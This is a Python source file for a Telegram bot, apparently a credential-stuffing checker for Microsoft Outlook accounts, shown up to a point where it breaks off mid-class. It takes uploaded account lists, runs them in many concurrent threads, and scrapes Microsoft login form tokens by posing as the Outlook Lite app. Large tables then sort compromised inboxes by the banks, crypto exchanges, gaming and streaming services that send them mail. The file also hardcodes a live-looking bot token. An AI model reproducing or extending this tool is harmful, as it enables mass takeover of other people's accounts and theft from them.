import asyncio
import os
import re
import json
import uuid
import time
import itertools
import urllib.parse
import base64
from datetime import datetime, date, timedelta
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional
from queue import Queue
import io

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8331199468:AAFvWEwCNJdK7o_pm2KzJkSmJuh179zSnno"
ADMIN_IDS = [1720020794]
MAX_CONCURRENT_JOBS = 3
THREADS_PER_JOB = 20
DASHBOARD_UPDATE_INTERVAL = 15
ACCOUNT_DELAY = 0.03
PROXY_LIST = []
PROXY_ROTATION = False
RESULT_BASE_DIR = "results"
USER_DATA_FILE = "users.json"

# ================= FILE SIZE LIMITS (bytes) =================
FILE_SIZE_LIMITS = {
    0: 5 * 1024 * 1024,
    1: 15 * 1024 * 1024,
    2: 30 * 1024 * 1024,
}

# ================= DAILY FILE UPLOAD LIMITS =================
DAILY_FILE_LIMITS = {
    0: 3,
    1: 9999,
    2: 9999,
}

# ================= SENDER EMAIL -> PLATFORM NAME MAPPING =================
SENDER_MAP = {
    # ── Gaming ────────────────────────────────────────────────────────────────
    "noreply@epicgames.com": "Epic Games",
    "help@epicgames.com": "Epic Games",
    "no-reply@epicgames.com": "Epic Games",
    "noreply@accounts.riotgames.com": "Riot Games",
    "no-reply@riotgames.com": "Riot Games",
    "support@riotgames.com": "Riot Games",
    "no-reply@steampowered.com": "Steam",
    "noreply@steampowered.com": "Steam",
    "contact@steampowered.com": "Steam",
    "noreply@playstation.com": "PlayStation",
    "noreply@email.playstation.com": "PlayStation",
    "no-reply@playstation.com": "PlayStation",
    "psn@playstation.com": "PlayStation",
    "sony@txn-email.playstation.com": "PlayStation",
    "sony@email02.account.sony.com": "PlayStation",
    "no-reply@sony.com": "PlayStation",
    "service@sony.com": "PlayStation",
    "noreply@xbox.com": "Xbox",
    "no-reply@xbox.com": "Xbox",
    "xbox@microsoft.com": "Xbox",
    "noreply@id.supercell.com": "Supercell",
    "support@supercell.com": "Supercell",
    "accounts@roblox.com": "Roblox",
    "noreply@roblox.com": "Roblox",
    "no-reply@roblox.com": "Roblox",
    "noreply@news.ubisoft.com": "Ubisoft",
    "noreply@ubisoft.com": "Ubisoft",
    "no-reply@ubisoft.com": "Ubisoft",
    "no-reply@accounts.ea.com": "EA",
    "no-reply@ea.com": "EA",
    "noreply@ea.com": "EA",
    "noreply@battle.net": "Battle.net",
    "no-reply@battle.net": "Battle.net",
    "noreply@blizzard.com": "Battle.net",
    "no-reply@blizzard.com": "Battle.net",
    "noreply@nintendo.com": "Nintendo",
    "no-reply@nintendo.com": "Nintendo",
    "noreply@rockstargames.com": "Rockstar",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Minecraft",
    "noreply@pubg.com": "PUBG",
    "noreply@pubgmobile.com": "PUBG Mobile",
    "noreply@valorant.com": "Valorant",
    "noreply@leagueoflegends.com": "League of Legends",
    "noreply@fortnite.com": "Fortnite",
    # ── Streaming ─────────────────────────────────────────────────────────────
    "no-reply@netflix.com": "Netflix",
    "info@mailer.netflix.com": "Netflix",
    "noreply@mailer.netflix.com": "Netflix",
    "account@netflix.com": "Netflix",
    "noreply@netflix.com": "Netflix",
    "noreply@crunchyroll.com": "Crunchyroll",
    "no-reply@crunchyroll.com": "Crunchyroll",
    "support@crunchyroll.com": "Crunchyroll",
    "noreply@disneyplus.com": "Disney+",
    "no-reply@disneyplus.com": "Disney+",
    "disneyplus@disneyplus.com": "Disney+",
    "noreply@primevideo.com": "Amazon Prime Video",
    "no-reply@primevideo.com": "Amazon Prime Video",
    "primevideo@amazon.com": "Amazon Prime Video",
    "noreply@hbomax.com": "HBO Max",
    "no-reply@hbomax.com": "HBO Max",
    "noreply@max.com": "HBO Max",
    "no-reply@max.com": "HBO Max",
    "noreply@appletv.apple.com": "Apple TV+",
    "no-reply@appletv.apple.com": "Apple TV+",
    "no-reply@hulu.com": "Hulu",
    "no-reply@paramountplus.com": "Paramount+",
    "noreply@plex.tv": "Plex",
    "no-reply@youtube.com": "YouTube",
    # ── Music ─────────────────────────────────────────────────────────────────
    "noreply@accounts.spotify.com": "Spotify",
    "no-reply@spotify.com": "Spotify",
    "noreply@spotify.com": "Spotify",
    "noreply@music.apple.com": "Apple Music",
    "no-reply@music.apple.com": "Apple Music",
    "noreply@deezer.com": "Deezer",
    "no-reply@deezer.com": "Deezer",
    "noreply@soundcloud.com": "SoundCloud",
    "no-reply@soundcloud.com": "SoundCloud",
    "noreply@tidal.com": "Tidal",
    "noreply@music.youtube.com": "YouTube Music",
    "no-reply@youtubemusic.com": "YouTube Music",
    # ── Finance ───────────────────────────────────────────────────────────────
    "no-reply@paypal.com": "PayPal",
    "noreply@paypal.com": "PayPal",
    "service@paypal.com": "PayPal",
    "no-reply@info.coinbase.com": "Coinbase",
    "noreply@coinbase.com": "Coinbase",
    "no-reply@coinbase.com": "Coinbase",
    "no-reply@binance.com": "Binance",
    "noreply@binance.com": "Binance",
    "support@binance.com": "Binance",
    "no-reply@wise.com": "Wise",
    "noreply@wise.com": "Wise",
    "transfers@wise.com": "Wise",
    "noreply@payoneer.com": "Payoneer",
    "no-reply@payoneer.com": "Payoneer",
    "support@payoneer.com": "Payoneer",
    "noreply@skrill.com": "Skrill",
    "no-reply@skrill.com": "Skrill",
    "noreply@stripe.com": "Stripe",
    "no-reply@stripe.com": "Stripe",
    "support@stripe.com": "Stripe",
    "noreply@kraken.com": "Kraken",
    "noreply@kucoin.com": "KuCoin",
    "noreply@bybit.com": "Bybit",
    "noreply@crypto.com": "Crypto.com",
    "noreply@metamask.io": "MetaMask",
    "no-reply@ledger.com": "Ledger",
    "no-reply@blockchain.com": "Blockchain",
    # ── E-commerce ────────────────────────────────────────────────────────────
    "noreply@amazon.com": "Amazon",
    "no-reply@amazon.com": "Amazon",
    "shipment-tracking@amazon.com": "Amazon",
    "noreply@ebay.com": "eBay",
    "no-reply@ebay.com": "eBay",
    "noreply@aliexpress.com": "AliExpress",
    "no-reply@aliexpress.com": "AliExpress",
    "support@aliexpress.com": "AliExpress",
    "noreply@shein.com": "Shein",
    "no-reply@shein.com": "Shein",
    "newsletter@shein.com": "Shein",
    "noreply@temu.com": "Temu",
    "no-reply@temu.com": "Temu",
    "noreply@etsy.com": "Etsy",
    "no-reply@etsy.com": "Etsy",
    "transaction@etsy.com": "Etsy",
    "noreply@nike.com": "Nike",
    # ── Social Media ──────────────────────────────────────────────────────────
    "noreply@facebook.com": "Facebook",
    "notification@facebookmail.com": "Facebook",
    "noreply@facebookmail.com": "Facebook",
    "security@facebookmail.com": "Facebook",
    "update@facebookmail.com": "Facebook",
    "noreply@instagram.com": "Instagram",
    "noreply@mail.instagram.com": "Instagram",
    "security@mail.instagram.com": "Instagram",
    "no-reply@mail.instagram.com": "Instagram",
    "noreply@tiktok.com": "TikTok",
    "no-reply@tiktok.com": "TikTok",
    "noreply@tiktokmail.com": "TikTok",
    "no-reply@tiktokmail.com": "TikTok",
    "noreply@twitter.com": "Twitter (X)",
    "no-reply@twitter.com": "Twitter (X)",
    "noreply@x.com": "Twitter (X)",
    "no-reply@x.com": "Twitter (X)",
    "info@twitter.com": "Twitter (X)",
    "noreply@snapchat.com": "Snapchat",
    "no-reply@snapchat.com": "Snapchat",
    "support@snapchat.com": "Snapchat",
    "noreply@linkedin.com": "LinkedIn",
    "no-reply@linkedin.com": "LinkedIn",
    "messages-noreply@linkedin.com": "LinkedIn",
    "noreply@pinterest.com": "Pinterest",
    "no-reply@pinterest.com": "Pinterest",
    # ── Tech / Cloud ──────────────────────────────────────────────────────────
    "noreply@accounts.google.com": "Google",
    "no-reply@accounts.google.com": "Google",
    "noreply@google.com": "Google",
    "noreply@microsoft.com": "Microsoft",
    "no-reply@microsoft.com": "Microsoft",
    "noreply@dropbox.com": "Dropbox",
    "no-reply@dropbox.com": "Dropbox",
    "noreply@onedrive.com": "OneDrive",
    "noreply@icloud.com": "iCloud",
    "no-reply@icloud.com": "iCloud",
    "do-not-reply@yahoo.com": "Yahoo",
    "noreply@yahoo.com": "Yahoo",
    "noreply@yahoomail.com": "Yahoo",
    "noreply@mega.nz": "MEGA",
    "noreply@canva.com": "Canva",
    "noreply@adobe.com": "Adobe",
    "noreply@slack.com": "Slack",
    "noreply@zoom.us": "Zoom",
    "no-reply@zoom.us": "Zoom",
    "no-reply@nordvpn.com": "NordVPN",
    "no-reply@nordaccount.com": "NordVPN",
    "noreply@expressvpn.com": "ExpressVPN",
    # ── Education / Dev ───────────────────────────────────────────────────────
    "noreply@udemy.com": "Udemy",
    "no-reply@udemy.com": "Udemy",
    "noreply@coursera.org": "Coursera",
    "no-reply@coursera.org": "Coursera",
    "accounts@coursera.org": "Coursera",
    "noreply@edx.org": "edX",
    "no-reply@edx.org": "edX",
    "noreply@skillshare.com": "Skillshare",
    "no-reply@skillshare.com": "Skillshare",
    "noreply@github.com": "GitHub",
    "no-reply@github.com": "GitHub",
    "noreply@stackoverflow.com": "Stack Overflow",
    "noreply@gitlab.com": "GitLab",
    "noreply@duolingo.com": "Duolingo",
    "noreply@medium.com": "Medium",
    "noreply@figma.com": "Figma",
    # ── Travel / Services ─────────────────────────────────────────────────────
    "noreply@uber.com": "Uber",
    "no-reply@uber.com": "Uber",
    "uber@uber.com": "Uber",
    "receipts@uber.com": "Uber",
    "uber@t.uber.com": "Uber",
    "noreply=uber.com@mgt.uber.com": "Uber",
    "noreply@airbnb.com": "Airbnb",
    "no-reply@airbnb.com": "Airbnb",
    "automated@airbnb.com": "Airbnb",
    "noreply@booking.com": "Booking.com",
    "no-reply@booking.com": "Booking.com",
    "noreply@bstatic.com": "Booking.com",
    "noreply@tripadvisor.com": "Tripadvisor",
    "no-reply@tripadvisor.com": "Tripadvisor",
    "memberservices@tripadvisor.com": "Tripadvisor",
    # ── Communication ─────────────────────────────────────────────────────────
    "noreply@telegram.org": "Telegram",
    "no-reply@telegram.org": "Telegram",
    "noreply@whatsapp.com": "WhatsApp",
    "no-reply@whatsapp.com": "WhatsApp",
    "security@whatsapp.com": "WhatsApp",
    "no-reply@discord.com": "Discord",
    "noreply@discord.com": "Discord",
    "noreply@zoom.us": "Zoom",
    "noreply@skype.com": "Skype",
    "no-reply@skype.com": "Skype",
    "noreply@apple.com": "Apple",
    # ── Misc / Entertainment ──────────────────────────────────────────────────
    "noreply@reddit.com": "Reddit",
    "no-reply@reddit.com": "Reddit",
    "noreply@twitch.tv": "Twitch",
    "no-reply@twitch.tv": "Twitch",
    "noreply@kick.com": "Kick",
    "no-reply@kick.com": "Kick",
    "noreply@patreon.com": "Patreon",
    "no-reply@patreon.com": "Patreon",
    "noreply@quora.com": "Quora",
    "no-reply@quora.com": "Quora",
    "noreply@googledrive.com": "Google Drive",
}

SENDER_PATTERNS = list(SENDER_MAP.keys())

# ================= PREMIUM PLATFORM DETECTION =================
PREMIUM_PLATFORMS = {
    "Netflix", "Crunchyroll", "Disney+", "Amazon Prime Video", "HBO Max", "Apple TV+",
    "Spotify", "Apple Music", "Deezer", "YouTube Music", "Tidal",
    "PlayStation", "Xbox", "EA", "Twitch",
    "TikTok", "Facebook", "Instagram", "LinkedIn",
    "Discord", "Reddit", "Patreon", "Kick",
    "GitHub", "Udemy", "Coursera", "Binance",
}

PLATFORM_EMOJIS = {
    # Gaming
    "Epic Games": "🎮", "Riot Games": "⚔️", "Steam": "🎮",
    "PlayStation": "🎮", "Xbox": "🎮", "Supercell": "🏆",
    "Roblox": "🧱", "Ubisoft": "🗡️", "EA": "⚽",
    "Battle.net": "🔵", "Nintendo": "🔴", "Rockstar": "⭐",
    "Minecraft": "⛏️", "PUBG": "🎯", "Valorant": "🔫",
    "League of Legends": "⚔️", "Fortnite": "🎯",
    # Streaming
    "Netflix": "🎬", "Crunchyroll": "🌸", "Disney+": "🏰",
    "Amazon Prime Video": "📺", "Amazon Prime": "📺",
    "HBO Max": "👑", "Apple TV+": "🍎", "Hulu": "📺",
    "Paramount+": "⛰️", "Plex": "📺", "YouTube": "▶️",
    # Music
    "Spotify": "🎧", "Apple Music": "🎵", "Deezer": "🎵",
    "SoundCloud": "🔶", "Tidal": "🌊", "YouTube Music": "🎵",
    # Finance
    "PayPal": "💳", "Coinbase": "₿", "Binance": "🟡",
    "Wise": "💚", "Payoneer": "🔴", "Skrill": "💜",
    "Stripe": "💙", "Kraken": "🐙", "KuCoin": "🟢",
    "Bybit": "🔷", "Crypto.com": "💎", "MetaMask": "🦊",
    "Ledger": "🔐", "Blockchain": "⛓️",
    # E-commerce
    "Amazon": "📦", "eBay": "🛒", "AliExpress": "🛍️",
    "Shein": "👗", "Temu": "🛒", "Etsy": "🎨", "Nike": "👟",
    # Social Media
    "Facebook": "📘", "Instagram": "📷", "TikTok": "🎵",
    "Twitter (X)": "🐦", "Snapchat": "👻", "LinkedIn": "💼",
    "Pinterest": "📌",
    # Tech / Cloud
    "Google": "🔍", "Microsoft": "🪟", "Dropbox": "📦",
    "OneDrive": "☁️", "iCloud": "☁️", "Yahoo": "💜",
    "Apple": "🍎", "MEGA": "☁️", "Canva": "🎨",
    "Adobe": "🖌️", "Slack": "💬", "NordVPN": "🛡️",
    "ExpressVPN": "🛡️",
    # Education / Dev
    "Udemy": "📚", "Coursera": "🎓", "edX": "🎓",
    "Skillshare": "✏️", "GitHub": "🐙", "GitLab": "🦊",
    "Stack Overflow": "📚", "Duolingo": "🦜", "Medium": "✍️",
    "Figma": "🎨",
    # Travel / Services
    "Uber": "🚗", "Airbnb": "🏠", "Booking.com": "🏨",
    "Tripadvisor": "✈️",
    # Communication
    "Telegram": "✈️", "WhatsApp": "💬", "Discord": "💬",
    "Zoom": "📹", "Skype": "🔵",
    # Misc
    "Reddit": "🟠", "Twitch": "💜", "Kick": "🟢",
    "Patreon": "🎭", "Quora": "❓",
}

SUBSCRIPTION_PATTERNS = {
    "Netflix": [
        (re.compile(r'premium', re.I), "Premium 4K"),
        (re.compile(r'standard with ads', re.I), "Standard w/Ads"),
        (re.compile(r'standard', re.I), "Standard"),
        (re.compile(r'basic', re.I), "Basic"),
        (re.compile(r'member', re.I), "Member"),
    ],
    "PlayStation": [
        (re.compile(r'ps plus premium|playstation plus premium', re.I), "PS Plus Premium"),
        (re.compile(r'ps plus extra|playstation plus extra', re.I), "PS Plus Extra"),
        (re.compile(r'ps plus essential|playstation plus essential', re.I), "PS Plus Essential"),
        (re.compile(r'ps plus|playstation plus', re.I), "PS Plus"),
        (re.compile(r'ps now|playstation now', re.I), "PS Now"),
        (re.compile(r'ea play', re.I), "EA Play"),
    ],
    "Crunchyroll": [
        (re.compile(r'ultimate fan', re.I), "Ultimate Fan"),
        (re.compile(r'mega fan', re.I), "Mega Fan"),
        (re.compile(r'fan plan|fan\b', re.I), "Fan"),
        (re.compile(r'premium', re.I), "Premium"),
        (re.compile(r'subscri', re.I), "Subscriber"),
    ],
    "TikTok": [
        (re.compile(r'tiktok live|live subscription', re.I), "LIVE Creator"),
        (re.compile(r'creator marketplace', re.I), "Creator Marketplace"),
        (re.compile(r'tiktok shop', re.I), "TikTok Shop"),
        (re.compile(r'creator', re.I), "Creator"),
    ],
    "Facebook": [
        (re.compile(r'meta verified|verified badge', re.I), "Meta Verified ✓"),
        (re.compile(r'ads manager|advertising', re.I), "Ads Account"),
        (re.compile(r'business suite|business manager', re.I), "Business"),
        (re.compile(r'marketplace', re.I), "Marketplace"),
    ],
    "Instagram": [
        (re.compile(r'meta verified|verified badge', re.I), "Meta Verified ✓"),
        (re.compile(r'creator', re.I), "Creator"),
        (re.compile(r'subscri', re.I), "Subscriber"),
        (re.compile(r'shop', re.I), "Instagram Shop"),
    ],
    "Spotify": [
        (re.compile(r'premium duo', re.I), "Premium Duo"),
        (re.compile(r'premium family', re.I), "Premium Family"),
        (re.compile(r'premium student', re.I), "Premium Student"),
        (re.compile(r'premium', re.I), "Premium"),
        (re.compile(r'free', re.I), "Free"),
    ],
    "Disney+": [
        (re.compile(r'premium|4k|no ads', re.I), "Premium"),
        (re.compile(r'basic|with ads', re.I), "Basic w/Ads"),
        (re.compile(r'bundle', re.I), "Bundle"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Amazon Prime Video": [
        (re.compile(r'prime video channels', re.I), "Prime Channels"),
        (re.compile(r'prime video', re.I), "Prime Video"),
        (re.compile(r'prime', re.I), "Prime"),
    ],
    "HBO Max": [
        (re.compile(r'ultimate|ad.free|no ads', re.I), "Ultimate Ad-Free"),
        (re.compile(r'with ads', re.I), "With Ads"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Apple TV+": [
        (re.compile(r'apple one', re.I), "Apple One"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Apple Music": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'individual|subscri', re.I), "Individual"),
    ],
    "Twitch": [
        (re.compile(r'turbo', re.I), "Turbo"),
        (re.compile(r'tier 3', re.I), "Tier 3"),
        (re.compile(r'tier 2', re.I), "Tier 2"),
        (re.compile(r'tier 1|subscri', re.I), "Tier 1"),
    ],
    "YouTube Music": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'premium', re.I), "Premium"),
    ],
    "LinkedIn": [
        (re.compile(r'premium career', re.I), "Premium Career"),
        (re.compile(r'premium business', re.I), "Premium Business"),
        (re.compile(r'sales navigator', re.I), "Sales Navigator"),
        (re.compile(r'recruiter', re.I), "Recruiter"),
        (re.compile(r'premium', re.I), "Premium"),
    ],
    "Patreon": [
        (re.compile(r'patron|subscri|member', re.I), "Patron"),
    ],
    "GitHub": [
        (re.compile(r'enterprise', re.I), "Enterprise"),
        (re.compile(r'team', re.I), "Team"),
        (re.compile(r'pro', re.I), "Pro"),
    ],
    "Udemy": [
        (re.compile(r'personal plan|subscri', re.I), "Personal Plan"),
        (re.compile(r'business', re.I), "Business"),
    ],
    "Coursera": [
        (re.compile(r'coursera plus', re.I), "Coursera Plus"),
        (re.compile(r'professional certificate', re.I), "Professional Cert"),
        (re.compile(r'subscri|enroll', re.I), "Enrolled"),
    ],
    "Discord": [
        (re.compile(r'nitro basic', re.I), "Nitro Basic"),
        (re.compile(r'nitro', re.I), "Nitro"),
        (re.compile(r'server boost|boost', re.I), "Server Boost"),
    ],
    "Reddit": [
        (re.compile(r'premium', re.I), "Reddit Premium"),
    ],
    "Kick": [
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Deezer": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'premium|hi.fi', re.I), "Premium"),
    ],
    "Binance": [
        (re.compile(r'vip', re.I), "VIP"),
        (re.compile(r'subscri|member', re.I), "Member"),
    ],
}


COUNTRY_FLAGS = {
    "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Canada": "🇨🇦",
    "Australia": "🇦🇺", "New Zealand": "🇳🇿", "Ireland": "🇮🇪",
    "Germany": "🇩🇪", "France": "🇫🇷", "Spain": "🇪🇸", "Italy": "🇮🇹",
    "Netherlands": "🇳🇱", "Belgium": "🇧🇪", "Switzerland": "🇨🇭",
    "Austria": "🇦🇹", "Portugal": "🇵🇹", "Sweden": "🇸🇪", "Norway": "🇳🇴",
    "Denmark": "🇩🇰", "Finland": "🇫🇮", "Poland": "🇵🇱", "Czech Republic": "🇨🇿",
    "Romania": "🇷🇴", "Hungary": "🇭🇺", "Greece": "🇬🇷", "Ukraine": "🇺🇦",
    "Russia": "🇷🇺", "Turkey": "🇹🇷", "Israel": "🇮🇱",
    "Saudi Arabia": "🇸🇦", "UAE": "🇦🇪", "Egypt": "🇪🇬",
    "India": "🇮🇳", "China": "🇨🇳", "Japan": "🇯🇵", "South Korea": "🇰🇷",
    "Taiwan": "🇹🇼", "Thailand": "🇹🇭", "Indonesia": "🇮🇩", "Malaysia": "🇲🇾",
    "Vietnam": "🇻🇳", "Philippines": "🇵🇭", "Iran": "🇮🇷",
    "Brazil": "🇧🇷", "Mexico": "🇲🇽", "Argentina": "🇦🇷", "Colombia": "🇨🇴",
    "Chile": "🇨🇱", "Peru": "🇵🇪",
}


def get_flag(country: str) -> str:
    if not country or country == "N/A":
        return "🌍"
    return COUNTRY_FLAGS.get(country, "🌍")


def detect_subscription(platform: str, subjects: List[str]) -> str:
    patterns = SUBSCRIPTION_PATTERNS.get(platform, [])
    for subject in subjects:
        for pattern, tier in patterns:
            if pattern.search(subject):
                return tier
    return ""


DOMAIN_PLATFORM_MAP = {
    # Gaming
    "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games",
    "steampowered.com": "Steam",
    "steam.com": "Steam",
    "playstation.com": "PlayStation",
    "email.playstation.com": "PlayStation",
    "sony.com": "PlayStation",
    "xbox.com": "Xbox",
    "id.supercell.com": "Supercell",
    "supercell.com": "Supercell",
    "roblox.com": "Roblox",
    "ubisoft.com": "Ubisoft",
    "ea.com": "EA",
    "accounts.ea.com": "EA",
    "battle.net": "Battle.net",
    "blizzard.com": "Battle.net",
    "nintendo.com": "Nintendo",
    "rockstargames.com": "Rockstar",
    "minecraft.net": "Minecraft",
    "mojang.com": "Minecraft",
    "pubg.com": "PUBG",
    "leagueoflegends.com": "League of Legends",
    "valorant.com": "Valorant",
    # Streaming
    "netflix.com": "Netflix",
    "mailer.netflix.com": "Netflix",
    "crunchyroll.com": "Crunchyroll",
    "disneyplus.com": "Disney+",
    "primevideo.com": "Amazon Prime Video",
    "hbomax.com": "HBO Max",
    "max.com": "HBO Max",
    "appletv.apple.com": "Apple TV+",
    "hulu.com": "Hulu",
    "paramountplus.com": "Paramount+",
    "plex.tv": "Plex",
    # Music
    "spotify.com": "Spotify",
    "accounts.spotify.com": "Spotify",
    "music.apple.com": "Apple Music",
    "deezer.com": "Deezer",
    "soundcloud.com": "SoundCloud",
    "tidal.com": "Tidal",
    "youtubemusic.com": "YouTube Music",
    "music.youtube.com": "YouTube Music",
    # Finance
    "paypal.com": "PayPal",
    "coinbase.com": "Coinbase",
    "info.coinbase.com": "Coinbase",
    "binance.com": "Binance",
    "wise.com": "Wise",
    "payoneer.com": "Payoneer",
    "skrill.com": "Skrill",
    "stripe.com": "Stripe",
    "kraken.com": "Kraken",
    "kucoin.com": "KuCoin",
    "bybit.com": "Bybit",
    "crypto.com": "Crypto.com",
    "metamask.io": "MetaMask",
    "ledger.com": "Ledger",
    "blockchain.com": "Blockchain",
    # E-commerce
    "amazon.com": "Amazon",
    "ebay.com": "eBay",
    "aliexpress.com": "AliExpress",
    "shein.com": "Shein",
    "temu.com": "Temu",
    "etsy.com": "Etsy",
    "nike.com": "Nike",
    # Social Media
    "facebook.com": "Facebook",
    "facebookmail.com": "Facebook",
    "instagram.com": "Instagram",
    "mail.instagram.com": "Instagram",
    "tiktok.com": "TikTok",
    "tiktokmail.com": "TikTok",
    "twitter.com": "Twitter (X)",
    "x.com": "Twitter (X)",
    "snapchat.com": "Snapchat",
    "linkedin.com": "LinkedIn",
    "pinterest.com": "Pinterest",
    # Tech / Cloud
    "accounts.google.com": "Google",
    "google.com": "Google",
    "microsoft.com": "Microsoft",
    "dropbox.com": "Dropbox",
    "onedrive.com": "OneDrive",
    "icloud.com": "iCloud",
    "yahoo.com": "Yahoo",
    "yahoomail.com": "Yahoo",
    "apple.com": "Apple",
    "mega.nz": "MEGA",
    "canva.com": "Canva",
    "adobe.com": "Adobe",
    "slack.com": "Slack",
    "nordvpn.com": "NordVPN",
    "nordaccount.com": "NordVPN",
    "expressvpn.com": "ExpressVPN",
    # Education / Dev
    "udemy.com": "Udemy",
    "coursera.org": "Coursera",
    "edx.org": "edX",
    "skillshare.com": "Skillshare",
    "github.com": "GitHub",
    "gitlab.com": "GitLab",
    "stackoverflow.com": "Stack Overflow",
    "duolingo.com": "Duolingo",
    "medium.com": "Medium",
    "figma.com": "Figma",
    # Travel / Services
    "uber.com": "Uber",
    "t.uber.com": "Uber",
    "mgt.uber.com": "Uber",
    "airbnb.com": "Airbnb",
    "booking.com": "Booking.com",
    "bstatic.com": "Booking.com",
    "tripadvisor.com": "Tripadvisor",
    # Communication
    "telegram.org": "Telegram",
    "whatsapp.com": "WhatsApp",
    "discord.com": "Discord",
    "zoom.us": "Zoom",
    "skype.com": "Skype",
    # Misc / Entertainment
    "reddit.com": "Reddit",
    "twitch.tv": "Twitch",
    "kick.com": "Kick",
    "patreon.com": "Patreon",
    "quora.com": "Quora",
}


def resolve_sender_platform(sender_address: str) -> str:
    if not sender_address or sender_address == "Unknown":
        return "Unknown"
    exact = SENDER_MAP.get(sender_address)
    if exact:
        return exact
    try:
        domain = sender_address.split("@")[-1].lower()
        if domain in DOMAIN_PLATFORM_MAP:
            return DOMAIN_PLATFORM_MAP[domain]
        parts = domain.split(".")
        for i in range(1, len(parts) - 1):
            parent = ".".join(parts[i:])
            if parent in DOMAIN_PLATFORM_MAP:
                return DOMAIN_PLATFORM_MAP[parent]
    except Exception:
        pass
    return sender_address


# ================= SESSION POOL =================
class SessionPool:
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = Queue()
        self._init_pool()

    def _init_pool(self):
        for _ in range(self.pool_size):
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=2,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.put(session)

    def get_session(self):
        return self.sessions.get(timeout=30)

    def return_session(self, session):
        session.cookies.clear()
        self.sessions.put(session)


session_pool = SessionPool(pool_size=THREADS_PER_JOB * 3)


# ================= TIME MANAGER =================
def get_today_istanbul():
    utc_now = datetime.utcnow()
    istanbul_now = utc_now + timedelta(hours=3)
    return istanbul_now.date()


# ================= USER DATABASE =================
def load_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)


def get_user(user_id: int) -> dict:
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    auto_approved = user_id in ADMIN_IDS

    if user_id_str not in users:
        users[user_id_str] = {
            "vip_level": 0,
            "total_jobs": 0,
            "total_hits": 0,
            "banned": False,
            "approved": auto_approved,
            "custom_daily_limit": None,
            "username": "",
            "daily_stats": {"date": today, "files_uploaded": 0}
        }
        save_users(users)
        print(f"👤 New user created: {user_id} approved={auto_approved}")
    else:
        user = users[user_id_str]
        if user.get("daily_stats", {}).get("date") != today:
            user["daily_stats"] = {"date": today, "files_uploaded": 0}
        user.setdefault("vip_level", 0)
        user.setdefault("total_jobs", 0)
        user.setdefault("total_hits", 0)
        user.setdefault("banned", False)
        user.setdefault("approved", auto_approved)
        user.setdefault("custom_daily_limit", None)
        user.setdefault("username", "")
        save_users(users)

    return users[user_id_str]


def get_daily_limit(user: dict) -> int:
    custom = user.get("custom_daily_limit")
    if custom is not None:
        return int(custom)
    return DAILY_FILE_LIMITS.get(user.get("vip_level", 0), DAILY_FILE_LIMITS[0])


def update_user(user_id: int, data: dict):
    users = load_users()
    uid_str = str(user_id)
    if uid_str not in users:
        get_user(user_id)
        users = load_users()
    users[uid_str].update(data)
    save_users(users)


def increment_daily_file_count(user_id: int):
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()

    if user_id_str not in users:
        return
    if "daily_stats" not in users[user_id_str]:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    elif users[user_id_str]["daily_stats"].get("date") != today:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}

    users[user_id_str]["daily_stats"]["files_uploaded"] += 1
    save_users(users)


# ================= OUTLOOK SENDER-BASED CHECKER =================
class OutlookSenderChecker:
    PPFT_PATTERN1 = re.compile(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"')
    PPFT_PATTERN2 = re.compile(r'name="PPFT".*?value="([^"]*)"')
    URLPOST_PATTERN1 = re.compile(r'urlPost":"(.*?)"')
    URLPOST_PATTERN2 = re.compile(r"urlPost:'(.*?)'")
    UAID_PATTERN1 = re.compile(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"')
    UAID_PATTERN2 = re.compile(r'name="uaid" id="uaid" value="(.*?)"')
    OPID_PATTERN = re.compile(r'opid%3d(.*?)%26')
    OPIDT_PATTERN = re.compile(r'opidt%3d(.*?)&')
    CODE_PATTERN = re.compile(r'code=(.*?)&')

    def __init__(self):
        self.session = None
        self.ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        self.client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        self.redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"

    def get_regex(self, pattern, text):
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_ppft(self, html):
        match = self.PPFT_PATTERN1.search(html)
        if match:
            return match.group(1)
        match = self.PPFT_PATTERN2.search(html)
        if match:
            return match.group(1)
        return None

    @staticmethod
    def _decode_id_token(id_token):
        try:
            parts = id_token.split('.')
            if len(parts) >= 2:
                padding = 4 - len(parts[1]) % 4
                payload_b64 = parts[1] + ('=' * (padding % 4))
                return json.loads(base64.urlsafe_b64decode(payload_b64))
        except Exception:
            pass
        return {}

    LOCALE_TO_COUNTRY = {
